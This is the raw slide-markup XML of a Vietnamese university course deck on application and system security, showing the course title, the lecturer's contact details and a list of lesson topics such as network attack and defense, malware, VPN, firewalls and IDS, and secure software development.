            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
          </a:ln>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311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blackWhite">
      <p:bgPr>
        <a:gradFill flip="none" rotWithShape="1">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="bg2">
                <a:lumMod val="50000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="33000">
              <a:schemeClr val="bg2"/>
            </a:gs>
            <a:gs pos="66000">
              <a:schemeClr val="bg2">
                <a:lumMod val="75000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="97000">
              <a:schemeClr val="bg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1301360"/>
            <a:ext cx="9612971" cy="2852737"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="7200" cap="none" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0"/>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ECE1"/>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9" name="L-Shape 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF5B4C6D-2825-4690-8D32-39CBF5E0F7E6}"/>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DFD43940-6D78-4E75-BDB6-8792768BB894}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="8286318" y="1685652"/>
            <a:ext cx="3152309" cy="4408489"/>
          </a:xfrm>
          <a:prstGeom prst="corner">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5837"/>
              <a:gd name="adj2" fmla="val 6502"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEDE3"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="EFEDE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772556420"/>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solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0"/>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6056586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1485900"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4800">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" noProof="0"/>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1" name="L-Shape 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91236E78-C797-4C31-BA0C-DB193BAF6D2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipV="1">
            <a:off x="8391654" y="1873024"/>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0" name="L-Shape 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BFA658F0-F295-40A9-8BA8-1F6CBDFBBE09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="8152968" y="1752327"/>
            <a:ext cx="3152309" cy="4408489"/>
          </a:xfrm>
          <a:prstGeom prst="corner">
            <a:avLst>
              <a:gd name="adj1" fmla="val 7085"/>
              <a:gd name="adj2" fmla="val 7750"/>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833236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1082870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7" name="Text Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAFD1631-6749-4027-9415-B72D163BBD58}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1560471" y="2297695"/>
            <a:ext cx="9071059" cy="2767600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="6000"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" noProof="0" smtClean="0"/>
              <a:t>Edit Master text styles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20885593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16956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45B175-C851-453B-B2A0-9A5CFCADC0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2E65F4A2-0E4F-4E49-A0BF-BEEC722033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9328AA27-3F13-4BFD-B949-21CF31910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EEEE99A2-0FED-42D4-9FBD-08CC1C3F8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F2468D4-5440-4CE2-BAB3-61D83F628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EC5C30-0B3A-4B13-ADDD-7C63C8AA921B}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4122039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Gray">
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="bg2"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7" title="Side bar">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFA7AFEF-D97A-4A94-A884-7F95E91332B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622095" y="0"/>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Side bar"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="478095" y="376"/>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25347954"/>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42900" indent="-342900" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="94000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="1000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPts val="200"/>
        </a:spcAft>
        <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
        <a:buChar char="•"/>
        <a:defRPr sz="2400" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="873252" indent="-342900" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="94000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="500"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPts val="200"/>
        </a:spcAft>
        <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
        <a:buChar char="•"/>
        <a:defRPr sz="2400" i="1" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="1330452" indent="-342900" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="94000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="500"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPts val="200"/>
        </a:spcAft>
        <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
        <a:buChar char="•"/>
        <a:defRPr sz="2000" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1787652" indent="-342900" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="94000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="500"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPts val="200"/>
        </a:spcAft>
        <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
        <a:buChar char="•"/>
        <a:defRPr sz="2000" i="1" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="2187702" indent="-285750" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="94000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="500"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPts val="200"/>
        </a:spcAft>
        <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
        <a:buChar char="•"/>
        <a:defRPr sz="18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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.svg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.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53.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.svg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.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557253" y="68033"/>
            <a:ext cx="9144000" cy="2126512"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>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Bảo</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mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="7200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ứng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dụng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và</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Hệ</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thống</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="5" name="Straight Connector 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA65E432-C1E6-4C36-BF8E-2DA25E65DC32}"/>
              </a:ext>
              <a:ext uri="{C183D7F6-B498-43B3-948B-1728B52AA6E4}">
                <adec:decorative xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3579677" y="2200147"/>
            <a:ext cx="49149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57253" y="2313117"/>
            <a:ext cx="9144000" cy="1655762"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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Giảng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viên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Nguyễn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Kim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Tuấn</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Khoa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Hệ</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thống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thông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tin</a:t>
            </a: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Trường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CNTT</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Đại</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học</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631394">
            <a:off x="4662065" y="3581995"/>
            <a:ext cx="3194131" cy="319413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rot="1338607" flipH="1">
            <a:off x="-70759" y="489541"/>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rot="21078969">
            <a:off x="2532347" y="3896449"/>
            <a:ext cx="2453456" cy="2453456"/>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rot="1213697">
            <a:off x="24665" y="2787872"/>
            <a:ext cx="3245427" cy="3245427"/>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rot="20451125">
            <a:off x="8283867" y="2036637"/>
            <a:ext cx="3005286" cy="3005286"/>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rot="18889495">
            <a:off x="9914052" y="2300565"/>
            <a:ext cx="1574403" cy="1574403"/>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rot="20520790">
            <a:off x="10660011" y="2938737"/>
            <a:ext cx="1488402" cy="1488402"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="12" name="Group 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7193007" y="5769269"/>
            <a:ext cx="4857966" cy="985602"/>
            <a:chOff x="360535" y="271204"/>
            <a:chExt cx="5047501" cy="985602"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="Rounded Rectangle 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="360535" y="425063"/>
              <a:ext cx="5047501" cy="721286"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst/>
            </a:pr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ounded Rectangle 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="413854" y="271204"/>
              <a:ext cx="4940863" cy="9856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784" tIns="0" rIns="190784" bIns="0" numCol="1" spcCol="1270" anchor="ctr" anchorCtr="0">
              <a:noAutofit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr lvl="0" algn="r" defTabSz="1644650">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                  <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                  <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                </a:rPr>
                <a:t>0906.566.665 – 0932.401.907 (</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                  <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                  <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                </a:rPr>
                <a:t>Zalo</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lvl="0" algn="r" defTabSz="1644650">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="2000" kern="1200" dirty="0" err="1" smtClean="0">
                  <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                  <a:ea typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                  <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                </a:rPr>
                <a:t>tuan.nguyenkim@phenikaa-uni.edu.vn</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="2000" kern="1200" dirty="0">
                <a:latin typeface="Tahoma" panose="020B060403050404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29063970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521284" y="64869"/>
            <a:ext cx="8048289" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>BẢO</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MẬT</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ỨNG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DỤNG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VÀ</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HỆ</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THỐNG</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="3600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CSE702005</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-1-1-25 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>N03</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="9" name="Group 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{798EA88B-C439-4F17-9585-820972CE0BA5}"/>
              </a:ext>
              <a:ext uri="{C183D7F6-B498-43B3-948B-1728B52AA6E4}">
                <adec:decorative xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9009186" y="0"/>
            <a:ext cx="3668917" cy="6941127"/>
            <a:chOff x="9009186" y="0"/>
            <a:chExt cx="3668917" cy="6941127"/>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1" name="Graphic 10" descr="Clipboard">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F58D0C9-D25F-4044-8F1B-4190E5A1BD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009186" y="3272210"/>
              <a:ext cx="3668917" cy="3668917"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:gr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180084" y="1511720"/>
            <a:ext cx="9496177" cy="4807187"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Tổng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quan</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về</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thống</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a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Bài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> 2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Tấn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công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và</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Phòng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thủ</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trên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không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gian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mạng</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3.1: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1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>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3.2: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2)</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4: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Cơ</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sở</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dữ</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liệu</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5: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API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điều</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hành</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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Bài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> 6: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Mã</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độc</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và</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Mã</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khai</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thác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF00FF"/>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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>7: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>BM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>hạ</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tầng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mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> E-Commerce: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>VPN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>FW - IDS</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8: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>Quy</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trình</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phát</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triển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phần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mềm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>toàn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
